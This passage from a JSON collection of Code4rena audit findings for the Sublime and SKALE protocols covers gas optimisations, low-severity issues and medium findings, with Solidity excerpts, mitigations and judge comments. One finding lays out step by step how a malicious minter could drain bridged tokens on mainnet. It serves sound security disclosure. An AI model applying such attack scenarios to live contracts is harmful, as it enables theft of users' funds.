_totalLiquidityWithdrawable.mul(balanceOf(_lender, _id)).div(minInitialSupply);\n  return _principalWithdrawable;\n}\n```\n\nIn `terminate()`, the shares withdrawable can simply be `_sharesHeld`.\n\n```jsx\nfunction terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {\n  address _strategy = pooledCLConstants[_id].borrowAssetStrategy;\n  address _borrowAsset = pooledCLConstants[_id].borrowAsset;\n  uint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;\n\n  SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);\n  delete pooledCLConstants[_id];\n  delete pooledCLVariables[_id];\n}\n```\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2022-03-sublime-findings/issues/19)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of the Sublime Finance V1 project on GitHub. The issue occurs when the `_start()` function is invoked with a non-zero start fee, resulting in the `totalSupply[id]` not being 1:1 with the borrow limit. This causes the `_principalWithdrawable` calculated to be more than expected when a lender attempts to withdraw their tokens. \n\nTo demonstrate the issue, an example is provided with the following conditions: Alice is the sole lender and has provided 100,000 tokens; the borrow limit is 99,000 because of a 1% start fee; and the borrower has borrowed zero amount. When Alice attempts to withdraw her tokens, the `_principalWithdrawable` amount is calculated as 100,000, which is more than the available principal amount of 99,000, so the withdrawal will fail.\n\nOne possible mitigation step is to save the initial supply in `minBorrowAmount` when the credit line is accepted, and replace `totalSupply[_id]` with it. In `terminate()`, the shares withdrawable can simply be `_sharesHeld`. Code amendment examples are also provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/19",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "5262",
      "title": "[G-04] `i++` can be wrapped by `unchecked` directory.",
      "impact": "GAS",
      "content": "\n`mainnet/MessageProxy.sol` and `mainnet/MessageProxyForMainnet.sol` contains for loop, but `i++` can be wrapped by unchecked directory to decrease the gas cost.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L221>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L515>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L118>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L235>\n\nHere is an example of the modification.\n\n    for (uint256 i = 0; i < messages.length; ) {\n        data = abi.encodePacked(\n            data,\n            bytes32(bytes20(messages[i].sender)),\n            bytes32(bytes20(messages[i].destinationContract)),\n            messages[i].data\n        );\n        unchecked {\n            i++;\n        }\n    }\n\nHere is the comparison of the gas cost at MessageProxyForMainnet.sol\n\n*   Before: 3403300\n*   After: 3388788\n*   Before - After: 14512 (About 0.4% reduction)\n\nIn addition to MessageProxy.sol, here are other opportunities to decrease gas cost by wrapping `i++` by unchecked directory at following files:\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/Linker.sol#L175>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/Linker.sol#L100>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/Linker.sol#L100>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L276>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L260>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L398>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459>\n\n***\n\n**[yavrsky (SKALE) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/46#issuecomment-1066996556):**\n > We prefer not to use \"unchecked\" for security reasons, even if it is applicable there. Also only marginal gas improvements.\n> \n> \n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/46#issuecomment-1112616638):**\n > To add #47 which is valued at 62500\n> \n> \n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/46#issuecomment-1118593584):**\n > G-01: Unchecked should save 20 gas per operation * 4 = 80 gas\n> \n> G-02: Valid but ultimately saves gas on the \"bad path\"\n> \n> G-03: Saves 20 gas\n> \n> G-04\n> Saves 20 gas per iteration * 4 = 80\n> \n> 11 * 20 = 220\n> \n> Additional gas saved:\n> 400\n> \n> Total Combined:\n> 62900\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#g-04-i-can-be-wrapped-by-unchecked-directory",
      "tags": [],
      "finders": []
    },
    {
      "id": "5261",
      "title": "[G-03] `withdrawFunds` function can reduce gas cost by using unchecked",
      "impact": "GAS",
      "content": "\n`_userWallets[msg.sender][schainHash] - amount` will never be less than 0, since it checks `amount <= _userWallets[msg.sender][schainHash]` at require function.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol#L171-L173>\n\n    require(amount <= _userWallets[msg.sender][schainHash], \"Balance is too low\");\n    require(!messageProxy.messageInProgress(), \"Message is in progress\");\n    _userWallets[msg.sender][schainHash] = _userWallets[msg.sender][schainHash] - amount;\n\nHere is an example of the modification.\n\n    require(amount <= _userWallets[msg.sender][schainHash], \"Balance is too low\");\n    require(!messageProxy.messageInProgress(), \"Message is in progress\");\n    unchecked {\n        _userWallets[msg.sender][schainHash] = _userWallets[msg.sender][schainHash] - amount;\n    }\n\nHere is the comparison of the gas cost at CommunityPool.sol\n\n*   Before: 2114911\n*   After: 2107176\n*   Before - After: 7735 (About 0.36% reduction)\n\n***\n\n#### `mainnet/MessageProxy.sol`\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#g-03-withdrawfunds-function-can-reduce-gas-cost-by-using-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5260",
      "title": "[G-02] `withdrawFunds` function can reduce the gas cost by reordering the condition of if statement.",
      "impact": "GAS",
      "content": "\nIn the if statement, it calls `_balanceIsSufficient` function first.  But it can check `activeUsers[msg.sender][schainHash]` to reduce the gas cost slightly.\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol#L174-L184>\n\n    if (\n        !_balanceIsSufficient(schainHash, msg.sender, 0) &&\n        activeUsers[msg.sender][schainHash]\n    ) {\n        activeUsers[msg.sender][schainHash] = false;\n        messageProxy.postOutgoingMessage(\n            schainHash,\n            schainLinks[schainHash],\n            Messages.encodeLockUserMessage(msg.sender)\n        );\n    }\n\nHere is an example of the modification.\n\n    if (\n        activeUsers[msg.sender][schainHash] &&\n        !_balanceIsSufficient(schainHash, msg.sender, 0)\n    ) {\n        activeUsers[msg.sender][schainHash] = false;\n        messageProxy.postOutgoingMessage(\n            schainHash,\n            schainLinks[schainHash],\n            Messages.encodeLockUserMessage(msg.sender)\n        );\n    }\n\nHere is the comparison of the gas cost at CommunityPool.sol\n\n*   Before: 2114911\n*   After: 2113003\n*   Before - After: 1908 (About 0.09% reduction)\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#g-02-withdrawfunds-function-can-reduce-the-gas-cost-by-reordering-the-condition-of-if-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5259",
      "title": "[G-01] `refundGasByUser` function can use unchecked directory and slight refactor may reduce gas fee.",
      "impact": "GAS",
      "content": "\nBy refactoring following code, it can reduce gas cost of `CommunityPool.sol`.\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol#L97-L111>\n\n    uint amount = tx.gasprice * gas;\n    if (amount > _userWallets[user][schainHash]) {\n        amount = _userWallets[user][schainHash];\n    }\n    _userWallets[user][schainHash] = _userWallets[user][schainHash] - amount;\n    if (!_balanceIsSufficient(schainHash, user, 0)) {\n        activeUsers[user][schainHash] = false;\n        messageProxy.postOutgoingMessage(\n            schainHash,\n            schainLinks[schainHash],\n            Messages.encodeLockUserMessage(user)\n        );\n    }\n    node.sendValue(amount);\n    return (tx.gasprice * gas - amount) / tx.gasprice;\n\nFirst, `_userWallets[user][schainHash] - amount` will never be less than 0 so can be wrapped by unchecked, since `amount` is always equal to or less than `_userWallets[user][schainHash]`.\nSecond, `(tx.gasprice * gas - amount) / tx.gasprice` will not underflown so can be wrapped by unchecked directory, since `tx.gasprice * gas - amount` will be equal to or more than 0.\n\nHere is an example of the modified code:\n\n    uint amount = tx.gasprice * gas;\n    if (amount > _userWallets[user][schainHash]) {\n        amount = _userWallets[user][schainHash];\n    }\n    unchecked {\n        _userWallets[user][schainHash] = _userWallets[user][schainHash] - amount;\n    }\n    if (!_balanceIsSufficient(schainHash, user, 0)) {\n        activeUsers[user][schainHash] = false;\n        messageProxy.postOutgoingMessage(\n            schainHash,\n            schainLinks[schainHash],\n            Messages.encodeLockUserMessage(user)\n        );\n    }\n    node.sendValue(amount);\n    unchecked {\n        return (tx.gasprice * gas - amount) / tx.gasprice;\n    }\n\nIt simply wraps the above mentioned code with unchecked directory.\n\nHere is the comparison of the gas cost at CommunityPool.sol\n\n*   Before: 2114911\n*   After: 2100269\n*   Before - After: 14642 (About 0.6% reduction)\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#g-01-refundgasbyuser-function-can-use-unchecked-directory-and-slight-refactor-may-reduce-gas-fee",
      "tags": [],
      "finders": []
    },
    {
      "id": "4240",
      "title": "[L-04] Missing zero-address check in the setter functions and initialize functions",
      "impact": "LOW",
      "content": "\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n### Proof of Concept\n\n1.  Navigate to the following contracts.\n\n<!---->\n\n    https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/CommunityLocker.sol#L253\n\n### Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n**[DimaStebaev (SKALE) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/67#issuecomment-1066886133):**\n > L-01 and L-02 is described in #2 \n> L-02: only SKALE chain owner are able to deploy smart contracts on it's SKALE chain and this actor is assumed as trusted.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/67#issuecomment-1118619134):**\n> ### L-01 : Front-runnable Initializers\n> Agree with finding in lack of any mitigation am marking this valid.\n> For the sponsor, this is how you can deploy and set data in one tx: https://github.com/Badger-Finance/badger-strategy-mix-v1/blob/c97eda8cb60d0dcfd62be956a2aab4c86353de65/contracts/proxy/AdminUpgradeabilityProxy.sol#L225\n> \n> ### L-02 : Initializer reentrancy may lead to double initialization\n> Finding is valid, and mitigation is to upgrade to newer OZ code\n> \n> \n> ### L-03 : ERC1155Supply vulnerability in OpenZeppelin Contracts\n> Valid\n> \n> \n> ### L-04 : Missing zero-address check in the setter functions and initialize functions\n> Agree\n> \n> e.g. -> Vulnerability in OZ -> See disclosure -> Upgrade to xyz\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/67#issuecomment-1147571670):**\n > Making this the winner of QA Reports, mostly because it offers some unique findings in a proper QA Format.\n> \n> In terms of Findings Kirk-Baird is basically there, I ended up making this report win as it was submitted as QA rather than an aggregate of downgraded findings.\n> \n> That said I believe this report could have had a couple extra findings to make it truly a winner.\n> \n> L-01: Front-runnable Initializers -> Low\n> \n> L-02 : Initializer reentrancy may lead to double initialization -> Low\n> \n> L-03 : ERC1155Supply vulnerability in OpenZeppelin Contracts -> Low\n> \n> L-04 : Missing zero-address check in the setter functions and initialize functions -> Low\n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#l-04-missing-zero-address-check-in-the-setter-functions-and-initialize-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "4239",
      "title": "[L-03] ERC1155Supply vulnerability in OpenZeppelin Contracts",
      "impact": "LOW",
      "content": "\nWhen ERC1155 tokens are minted, a callback is invoked on the receiver of those tokens, as required by the spec. When including the ERC1155Supply extension, total supply is not updated until after the callback, thus during the callback the reported total supply is lower than the real number of tokens in circulation.\n\nIf a system relies on accurately reported supply, an attacker may be able to mint tokens and invoke that system after receiving the token balance but before the supply is updated.\n\n### Proof of Concept\n\n1.  Go to contracts directory.\n\n2.  On the package.json, openzeppelin 4.3.2 is defined.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/package.json>\n\n\n### Recommended Mitigation Steps\n\nA fix is included in version 4.3.3 of @openzeppelin/contracts and @openzeppelin/contracts-upgradeable.\n\n### Reference\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wmpv-c2jp-j2xg>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#l-03-erc1155supply-vulnerability-in-openzeppelin-contracts",
      "tags": [],
      "finders": []
    },
    {
      "id": "4238",
      "title": "[L-02] Initializer reentrancy may lead to double initialization",
      "impact": "LOW",
      "content": "\nInitializer functions that are invoked separate from contract creation (the most prominent example being minimal proxies) may be reentered if they make an untrusted non-view external call.\n\nOnce an initializer has finished running it can never be re-executed. However, an exception put in place to support multiple inheritance made reentrancy possible in the scenario described above, breaking the expectation that there is a single execution.\n\nNote that upgradeable proxies are commonly initialized together with contract creation, where reentrancy is not feasible, so the impact of this issue is believed to be minor.\n\n### Proof of Concept\n\n1.  Go to contracts directory.\n\n2.  On the package.json, openzeppelin 4.3.2 is defined.\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/package.json>\n\n### Recommended Mitigation Steps\n\nAvoid untrusted external calls during initialization.\n\nA fix is included in the version v4.4.1 of @openzeppelin/contracts and @openzeppelin/contracts-upgradeable.\n\n### Reference\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-9c22-pwxw-p6hx>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#l-02-initializer-reentrancy-may-lead-to-double-initialization",
      "tags": [],
      "finders": []
    },
    {
      "id": "4237",
      "title": "[L-01] Front-runnable Initializers",
      "impact": "LOW",
      "content": "\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n### Proof of Concept\n\n1.  Navigate to the following contracts.\n\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol#L59\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/SkaleManagerClient.sol#L54\n\n```\n\n2.  initialize functions does not have access control. They are vulnerable to front-running.\n\n### Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "#l-01-front-runnable-initializers",
      "tags": [],
      "finders": []
    },
    {
      "id": "1610",
      "title": "[M-11] Loss of pending messages (if any) in case removeConnectedChain is called",
      "impact": "MEDIUM",
      "content": "_Submitted by hubble_\n\nIf there are any unprocessed messages to be executed or processed, while removeConnectedChain is called, then they may be stuck from getting processed on the other end.\nIf these messages have transactions for any token transfer then it will get stuck or lost.\n\n### Proof of Concept\n\nContract : MessageProxy.sol\nLine : 313\n\n        function removeConnectedChain(string memory schainName) public virtual override onlyChainConnector {\n            bytes32 schainHash = keccak256(abi.encodePacked(schainName));\n            require(connectedChains[schainHash].inited, \"Chain is not initialized\");\n            delete connectedChains[schainHash];\n        } \n\n### Recommended Mitigation Steps\n\nCheck if there are any pending or unprocessed messages while removeConnectedChain is called and revert in that case.\nBetter to implement some functionality like pause just locally for the chain to be removed, before the actual removeConnectedChain is called.\n\n\n**[DimaStebaev (SKALE) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/63#issuecomment-1065005687):**\n > It duplicates #57 \n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/63#issuecomment-1144000708):**\n > I don't believe this to be a duplicate.\n> \n> I think the finding is valid in that because of the synchronicity of broadcasting messages, the chain could be removed before it receives all messages.\n> \n> This is a risk that end users do face when interacting with the system and the only use case I could think of would be for a malicious admin to deny certain operations.\n> \n> That said I don't believe there's any easy solution as this would have to be addressed at the meta level.\n> \n> I do think the finding is valid and of medium severity\n\ncstrangedk (SKALE) commented:\nIssue is acknowledged and work is pending on the roadmap to prevent improper use of removeConnectedChain.\n\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the MessageProxy.sol contract, specifically at line 313. The vulnerability is that if there are any unprocessed messages to be executed or processed while the removeConnectedChain function is called, then they may be stuck from getting processed on the other end. If these messages have transactions for any token transfer then it will get stuck or lost.\n\nThe recommended mitigation steps are to check if there are any pending or unprocessed messages while removeConnectedChain is called and revert in that case. It is also suggested to implement some functionality like pause just locally for the chain to be removed, before the actual removeConnectedChain is called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/63",
      "tags": [],
      "finders": [
        "hubble"
      ]
    },
    {
      "id": "1609",
      "title": "[M-10] NFT owner can change token URI",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nIn the `ERC721OnChain` implementation the *token owner* can set the token's URI using `setTokenURI`.\n\nUsually, this is token URI points to data defining the NFT (attributes, images, etc.).\nIt's usually set by the *contract* owner.\nA user that owns an NFT can just spoof any other NFT data by changing the token URI to any of the other NFTs.\n\n### Recommended Mitigation Steps\n\nDisallow the owner of an NFT to change its token URI\n\n\n**[DimaStebaev (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/26#issuecomment-1064987630):**\n > Acknowledged,`ERC721OnChain` is a default implementation. If the token is sensitive to URI change SKALE chain owner can use another one.\n> Not all ERC721 require that URI can't be changed.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/26#issuecomment-1143990919):**\n > Because the argument for this being a setting can be made I am excluding a high severity.\n> \n> However the code was brought into scope, the implementation under scrutiny does allow the owner to change the URI which is a known admin privilege.\n> \n> For those reasons I believe the finding to be valid and of medium severity\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the ERC721OnChain implementation, which is a type of non-fungible token (NFT). The bug is that the owner of the token can set the token's URI, which usually points to data defining the NFT (attributes, images, etc.). This means that a user that owns an NFT can spoof any other NFT data by changing the token URI to any of the other NFTs. The recommended mitigation step is to disallow the owner of an NFT to change its token URI. This would prevent the user from being able to spoof any other NFT data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/26",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1608",
      "title": "[M-09] Not compatible with Rebasing/Deflationary/Inflationary tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b, also found by cmichel, kirk-baird, gzeon, and IllIllI_\n\nThe `DepositBoxERC20` contract do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n### Recommended Mitigation Steps\n\nAdd support in contracts for such tokens before accepting user-supplied tokens\nConsider to check before/after balance on the vault.\n\n**[cstrangedk (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/50#issuecomment-1062060382):**\n > Issue is acknowledged and is contingent on SKALE Chain owner configuration and evaluation of compatibile tokens.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/50#issuecomment-1143858483):**\n > Because this is reliant on configuration, I believe the finding to be valid and of medium severity.\n> \n> End users can verify if the DepositBoxes are properly handling rebasing tokens at the time they wish to bridge\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `DepositBoxERC20` contract, which does not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest. To mitigate this issue, it is recommended to add support in contracts for such tokens before accepting user-supplied tokens and consider to check before/after balance on the vault. This bug report is applicable for developers who are working with the `DepositBoxERC20` contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/50",
      "tags": [],
      "finders": [
        "IllIllI",
        "cmichel",
        "gzeon",
        "kirk-baird",
        "0x1f8b"
      ]
    },
    {
      "id": "1607",
      "title": "[M-08] `BURNER_ROLE` can burn any amount of EthErc20 from an arbitrary address",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by 0x1f8b_\n\n### Impact\n\nSame as  <https://github.com/code-423n4/2022-01-livepeer-findings/issues/194>\n\n        function forceBurn(address account, uint256 amount) external override {\n            require(hasRole(BURNER_ROLE, _msgSender()), \"BURNER role is required\");\n            _burn(account, amount);\n        }\n\nUsing the forceBurn() function of EthErc20, an address with BURNER_ROLE can burn an arbitrary amount of tokens from any address.\n\nWe believe this is unnecessary and poses a serious centralization risk.\n\n### Proof of Concept\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/tokens/EthErc20.sol#L64-L67>\n\n### Recommended Mitigation Steps\n\nUpdate forceBurn function for only owner can burn his tokens.\n\n\n**[cstrangedk (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/16#issuecomment-1058516461):**\n > Issue is acknowledged and work is pending on the roadmap.  SKALE chain owners must carefully manage BURNER_ROLE, and end-users carefully monitor role.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2022-02-skale-findings/issues/16#issuecomment-1143855354):**\n > This finding boils down to the flexibility of the role system against a more immutable address being set on the constructor, ultimately the role is contingent on configuration and as such I believe the finding to be valid and of medium severity.\n> \n> In the majority of configurations this will be a non-issue, however end users may want to monitor how roles are set and how they change over time to avoid their tokens being burned\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the forceBurn() function of EthErc20. This function allows an address with BURNER_ROLE to burn an arbitrary amount of tokens from any address. This poses a serious centralization risk. The proof of concept can be found in the provided link. The recommended mitigation steps are to update the forceBurn function so that only the owner can burn their own tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/16",
      "tags": [],
      "finders": [
        "cccz",
        "0x1f8b"
      ]
    },
    {
      "id": "1606",
      "title": "[M-07] `transferredAmount` on mainnet can be drained if a malicious account can mint more tokens on Schain",
      "impact": "MEDIUM",
      "content": "_Submitted by kyliek, also found by cccz_\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L45>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/tokens/ERC20OnChain.sol#L49-L50>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L95>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/tokens/ERC20OnChain.sol#L60-L63>\n\n### Impact\n\nAnyone on Schain that is able to mint more tokens, other than the mint action from `postMessage` in `tokenManagerERC20` by bridging tokens over, can potentially drain the locked tokens in `transferredAmount` in `depositBoxERC20` on mainnet by calling exit with the same amount of tokens in `transferredAmount[schainHash][token]`.\n\nThis will trap other users' funds on sChain and lost those funds on mainnet to the malicious attacker.\n\nAn example of proof of concept using `ERC20OnChian` is given below. This case may seem to be special as the deployer of the clone contract is malicious.  However, this is a potential risk that generalises to other custom contracts with any `mint` functionality.\n\n### Proof of Concept (with ERC20)\n\n*   Malicious account deploys an ERC20 clone `ERC20OnChain` on Schain.\n\n*   By deployment, the malicious account is assigned the MINTER_ROLE on `ERC20OnChain` in the constructor.\n\n<!---->\n\n        constructor(\n            string memory contractName,\n            string memory contractSymbol\n        ) initializer\n        {\n            AccessControlEnumerableUpgradeable.__AccessControlEnumerable_init();\n            ERC20Upgradeable.__ERC20_init(contractName, contractSymbol);\n            ERC20BurnableUpgradeable.__ERC20Burnable_init();\n            _setRoleAdmin(MINTER_ROLE, MINTER_ROLE);\n            _setupRole(MINTER_ROLE, _msgSender());\n        }\n\n*   This ERC20 clone get registered on `tokenMangagerERC20.sol` by function `addERC20TokenByOwner`.\n\n<!---->\n\n        function addERC20TokenByOwner(\n            string calldata targetChainName,\n            address erc20OnMainChain,\n            address erc20OnSchain\n         )\n\n*   The malicious account wait for more users to deposit tokens on `depositBoxERC20.depositERC20`, which will increase the amount in `transferredAmount[schainHash][token]`\n\n<!---->\n\n        function depositERC20(\n            string calldata schainName,\n            address erc20OnMainnet,\n            uint256 amount\n        )\n\n*   Malicious account mint to his account the amount equal to `transferredAmount[schainHash][token]` on `ERC20OnChain`\n\n<!---->\n\n        function mint(address account, uint256 value) external override {\n            require(hasRole(MINTER_ROLE, _msgSender()), \"Sender is not a Minter\");\n            _mint(account, value);\n        }\n\n*   Malicious account calls `exitToMainERC20` in `TokenManagerERC20`.\n\n<!---->\n\n        function exitToMainERC20(\n            address contractOnMainnet,\n            uint256 amount\n        )\n            external\n            override\n        {\n            communityLocker.checkAllowedToSendMessage(msg.sender);\n            _exit(MAINNET_HASH, depositBox, contractOnMainnet, msg.sender, amount);\n        }\n\n*   `transferredAmount[schainHash][token]` is drained to the malicious account on mainnet and victims' tokens get stranded on schain.\n\n### Recommended Mitigation Steps\n\nDisable minting function to be called directly in `ERC20OnChain`. Only allow minting when bridging tokens over.\n\n\n**[cstrangedk (SKALE) disputed and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/38#issuecomment-1058709283):**\n > Issue is acknowledged and work is pending on the roadmap.  SKALE Chain owners must carefully manage MINTER_ROLE, and end-users carefully monitor role.\n\n\n**[GalloDaSballo (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-skale-findings/issues/38#issuecomment-1143850380):**\n > I believe the sponsor reply sheds further light into how the system will be used in 99% of cases.\n> \n> That said we have to judge the codebase for how it could be exploited and used by malicious actors, and I do agree with he warden that if the MINTER_ROLE is granted to someone (let's say the admin) then they could use it to drain funds from the mainnet side of the bridge.\n> \n> Because this is contingent on setup and Admin Privilege, I believe Medium Severity to be more appropriate.\n> \n> Switching from a role based system to an immutable Minter Address (the bridge contract) can be used as mitigation, alternatively sChain end users will have to monitor for these types of changes and act accordingly\n\n\n\n***\n\n",
